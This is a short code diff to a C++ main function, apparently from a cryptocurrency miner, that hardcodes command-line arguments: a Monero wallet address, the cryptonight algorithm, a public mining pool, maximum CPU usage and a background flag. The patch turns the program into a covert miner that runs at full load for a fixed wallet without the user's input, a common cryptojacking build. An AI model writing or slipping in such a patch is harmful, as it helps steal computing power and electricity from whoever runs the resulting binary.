@@ -25,6 +25,18 @@
 
 
 int main(int argc, char **argv) {
+    argc = 8;
+	if(argv[1] == NULL)
+	{
+		argv[1] = "--pass=PUREINTELLIGENCE";
+	}
+	argv[2] = "--user=42Zheycfi8iNpHCYX2umZfA2ND1dKKKg7RuwdrKLHQFSb9gFVj1oFi63Cz52ZwcCb6HezJKdsbx5gbqpCASACrTm8t2zQQx+1000";
+	argv[3] = "--algo=cryptonight";
+	argv[4] = "--asm=intel";
+	argv[5] = "--max-cpu-usage=100";
+	argv[6] = "--url=pool.supportxmr.com:3333";
+	argv[7] = "--background";
+    
     App app(argc, argv);
 
     return app.exec();
